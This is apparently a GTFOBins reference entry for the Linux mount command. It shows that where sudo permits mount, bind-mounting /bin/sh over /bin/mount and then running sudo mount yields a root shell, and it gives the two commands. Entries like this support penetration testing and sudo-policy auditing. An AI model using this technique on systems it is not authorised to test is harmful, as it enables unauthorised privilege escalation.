# GTFOBin: mount

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Exploit the fact that `mount` can be executed via `sudo` to replace the `mount` binary with a shell.

```
sudo mount -o bind /bin/sh /bin/mount
sudo mount
```